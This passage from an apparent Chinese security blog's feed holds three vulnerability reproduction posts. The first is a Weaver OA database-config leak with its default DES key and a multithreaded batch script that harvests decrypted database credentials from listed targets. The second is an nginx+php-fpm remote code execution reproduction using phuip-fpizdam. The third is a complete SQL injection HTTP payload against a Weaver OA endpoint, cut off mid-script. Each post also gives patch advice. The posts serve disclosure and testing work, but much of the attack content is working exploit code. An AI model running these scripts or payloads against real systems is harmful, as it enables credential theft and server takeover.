    <link href="http://zhengbao.wang/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>http://zhengbao.wang/泛微OA数据库配置信息泄露漏洞/</id>
    <published>2019-10-30T09:07:48.000Z</published>
    <updated>2019-10-30T11:18:39.393Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>泛微又双叒出问题了，2019年10月24日泛微OA被爆出数据库配置信息泄露，攻击者可通过访问指定页面获取加密的数据库配置信息，下面进行漏洞复现。</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>发生信息泄露的页面为<code>/mobile/DBconfigReader.jsp</code></p><p>访问可查看到一串乱码，返回一行乱码即表明漏洞存在。</p><p><img src="https://i.loli.net/2019/10/30/mQRcnEI2qxdbLvK.png" alt></p><p>此串乱码即为数据库配置信息经过DES加密后的结果，而默认密钥在源码中可查看为<code>1z2x3c4v5b6n</code></p><p><img src="https://i.loli.net/2019/10/30/suPlO5JjhiMg4BG.png" alt></p><p>验证脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desdecode</span><span class="params">(secret_key, s)</span>:</span></span><br><span class="line">cipherX = pyDes.des(<span class="string">'        '</span>)</span><br><span class="line">cipherX.setKey(secret_key)</span><br><span class="line">y = cipherX.decrypt(s)</span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_decode</span><span class="params">(res)</span>:</span></span><br><span class="line">data = desdecode(<span class="string">'1z2x3c4v5b6n'</span>, res.strip())</span><br><span class="line">data = data.strip()</span><br><span class="line"><span class="keyword">print</span> str(data)</span><br><span class="line"><span class="keyword">return</span> str(data)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">url = <span class="string">'http://zhengbao.wang/mobile/DBconfigReader.jsp'</span></span><br><span class="line">res = requests.get(url).content</span><br><span class="line">info_decode(res)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/30/JMa8hCTNin9PeI6.png" alt></p><p>批量检测脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls,threads)</span>:</span></span><br><span class="line"></span><br><span class="line">self.vb_urls = Queue.Queue()</span><br><span class="line">self.threads = threads</span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> urls:</span><br><span class="line">self.vb_urls.put(u[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#print self.vb_urls.get()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vb5_rce</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">with</span> threading.Lock():</span><br><span class="line"><span class="keyword">while</span> self.vb_urls.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">target = self.vb_urls.get()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">target = <span class="string">'http://'</span>+target</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line"> &#125;</span><br><span class="line">url=target+<span class="string">'/mobile/DBconfigReader.jsp'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">res=requests.get(url=url,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'\r\n\r\n'</span> <span class="keyword">in</span> res.text) <span class="keyword">and</span> (<span class="string">':'</span> <span class="keyword">in</span> res.content) <span class="keyword">and</span> <span class="string">'java'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">info = info_decode(res.content)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'user'</span> <span class="keyword">in</span> info:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Vuluable :'</span>+url+<span class="string">'     '</span>+res.text</span><br><span class="line">file_write(<span class="string">'e-cology-dbinfo.txt'</span>,url+<span class="string">'  |   '</span>+info+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] NotVuluable :'</span>+url</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[-] Not access :"</span>+str(res.status_code)+<span class="string">' | '</span>+url</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] Error :'</span>+url</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(self.threads):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] thread '</span>+ str(i)</span><br><span class="line">t = threading.Thread(target=self.vb5_rce)</span><br><span class="line">t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'e-cology-jsp-info.txt'</span>,<span class="string">'r'</span>)  <span class="keyword">as</span> f:</span><br><span class="line">r = json.loads(f.read())</span><br><span class="line">urls = r[<span class="string">'results'</span>]</span><br><span class="line"><span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_write</span><span class="params">(name,results)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,mode=<span class="string">'a'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(results)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desdecode</span><span class="params">(secret_key, s)</span>:</span></span><br><span class="line">cipherX = pyDes.des(<span class="string">'        '</span>)</span><br><span class="line">cipherX.setKey(secret_key)</span><br><span class="line">y = cipherX.decrypt(s)</span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_decode</span><span class="params">(res)</span>:</span></span><br><span class="line">data = desdecode(<span class="string">'1z2x3c4v5b6n'</span>, res.strip())</span><br><span class="line">data = data.strip()</span><br><span class="line"><span class="comment">#print str(data)</span></span><br><span class="line"><span class="keyword">return</span> str(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">urls = get_url()</span><br><span class="line">vb5_rce = Bruter(urls=urls,threads=<span class="number">20</span>)</span><br><span class="line">vb5_rce.run()</span><br></pre></td></tr></table></figure><h2 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h2><ul><li><p>官方安全补丁<a href="https://www.weaver.com.cn/cs/securityDownload.asp" target="_blank" rel="noopener"> https://www.weaver.com.cn/cs/securityDownload.asp </a></p></li><li><p>禁止访问<code>mobile/DBconfigReader.jsp</code></p></li></ul><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak/blob/master/OA.py" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak/blob/master/OA.py</a></p><p><a href="https://github.com/jas502n/DBconfigReader" target="_blank" rel="noopener">https://github.com/jas502n/DBconfigReader</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;泛微又双叒出问题了，2019年10月24日泛微OA被爆出数据库配置信息泄露，攻击者可通过访问指定页面
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="信息泄露" scheme="http://zhengbao.wang/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>nginx+php-fpm远程代码执行漏洞</title>
    <link href="http://zhengbao.wang/nginx-php-fpm%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://zhengbao.wang/nginx-php-fpm远程代码执行漏洞/</id>
    <published>2019-10-24T01:11:06.000Z</published>
    <updated>2019-10-24T01:12:19.901Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2019年9月26日，PHP官方发布了<a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">Ngnix+php-fpm在错误配置下造成的远程代码执行漏洞</a>(CVE-2019-11043)，2019年10月22日，漏洞poc被公开:<a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener"> https://github.com/neex/phuip-fpizdam </a></p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>在Ngnix+php-fpm环境下，如果Ngnix有如下配置，将会产生漏洞</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">location</span> <span class="title">~ [^/]\.php</span>(/|$) &#123;</span><br><span class="line">        fastcgi_split_path_<span class="literal">inf</span>o ^(.+?\.php)(/.*)$;</span><br><span class="line">        fastcgi_param PATH_<span class="literal">INF</span>O       $fastcgi_path_<span class="literal">inf</span>o;</span><br><span class="line">        fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用docker搭建漏洞，vubhub已有漏洞环境<a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043</a></p><p>docker-compose.yml</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'2'</span></span><br><span class="line">services:</span><br><span class="line"> nginx:</span><br><span class="line">   image: nginx:<span class="number">1</span></span><br><span class="line">   volumes:</span><br><span class="line">    - ./www:/usr/share/nginx/html</span><br><span class="line">    - ./default.conf:/etc/nginx/conf.d/default.conf</span><br><span class="line">   depends_on:</span><br><span class="line">    - php</span><br><span class="line">   ports:</span><br><span class="line">    - <span class="string">"8080:80"</span></span><br><span class="line"> php:</span><br><span class="line">   image: php:<span class="number">7.2</span>.<span class="number">10</span>-fpm</span><br><span class="line">   volumes:</span><br><span class="line">    - ./www:/var/www/html</span><br></pre></td></tr></table></figure><p>ngnix配置文件 default.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span> default_server;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">index</span> index.html index.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">fastcgi_param</span> PATH_INFO       <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="attribute">fastcgi_param</span>  REDIRECT_STATUS    <span class="number">200</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME /var/www/html<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span>  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> php:<span class="number">9000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后<code>docker-compose up -d</code>启动漏洞环境</p><p><img src="https://i.loli.net/2019/10/24/AX4JFgGafVwCMYd.png" alt></p><h3 id="安装-phuip-fpizdam"><a href="#安装-phuip-fpizdam" class="headerlink" title="安装 phuip-fpizdam"></a>安装 phuip-fpizdam</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="built_in">get</span> github.<span class="keyword">com</span>/neex/phuip-fpizdam</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> install github.<span class="keyword">com</span>/neex/phuip-fpizdam</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/24/eyJmW6SpdnUZL9c.png" alt></p><p>然后使用phuip-fpizdam进行利用<code>./phuip-fpizdam url</code>,成功如下。</p><p><img src="https://i.loli.net/2019/10/24/Eh6g9I7tG3CTHbj.png" alt></p><p>然后加参数<code>?a=cmd</code>即可执行任意命令。</p><p><img src="https://i.loli.net/2019/10/24/3WokGrzdgXAtU1y.png" alt></p><h2 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h2><ul><li><p>在业务不需要的情况下删除配置<code>fastcgi_split_path_info ^(.+?\.php)(/.*)$;</code> <code>fastcgi_param PATH_INFO  $fastcgi_path_info;</code></p></li><li><p>ngnix配置文件存在检查  <code>try_files $uri =404</code> 或者 <code>if (-f $uri)</code> </p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;2019年9月26日，PHP官方发布了&lt;a href=&quot;https://bugs.php.net/b
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="http://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>泛微OA前台sql注入漏洞检测(ORACLE数据库)</title>
    <link href="http://zhengbao.wang/%E6%B3%9B%E5%BE%AEOA%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-ORACLE%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://zhengbao.wang/泛微OA前台sql注入漏洞检测-ORACLE数据库/</id>
    <published>2019-10-11T03:56:55.000Z</published>
    <updated>2019-10-11T09:58:11.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>泛微提供了移动办公、微信办公、协同办公(OA)、流程管理、信息门户、知识管理、费控管理等功能，适用于手机和pc端，是当今比较主流的OA系统之一。前段时间刚爆出Beanshell接口任意代码执行<a href="[https://zhengbao.wang/%E6%B3%9B%E5%BE%AEOA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/](https://zhengbao.wang/泛微OA远程代码执行漏洞利用/">泛微OA远程代码执行漏洞利用</a>),现在又爆出前台sql注入漏洞。</p><h2 id="0x01-漏洞检测"><a href="#0x01-漏洞检测" class="headerlink" title="0x01 漏洞检测"></a>0x01 漏洞检测</h2><p>本次漏洞是由于WorkflowCenterTreeData接口在使用Oracle数据库时，参数过滤不严导致的sql注入漏洞。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: zhengbao.wang</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 2236</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select null,value from v$parameter order by (((1</span><br></pre></td></tr></table></figure><p>存在漏洞测试截图</p><p><img src="https://i.loli.net/2019/10/11/M92y4vrnzIJEGsH.png" alt></p><p>返回空数据，则不存在漏洞</p><p><img src="https://s2.ax1x.com/2019/10/11/uHy6zj.png" alt></p><p>验证脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_test</span><span class="params">(target)</span>:</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line"> &#125;</span><br><span class="line">url=target+<span class="string">'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333'</span></span><br><span class="line">payload=<span 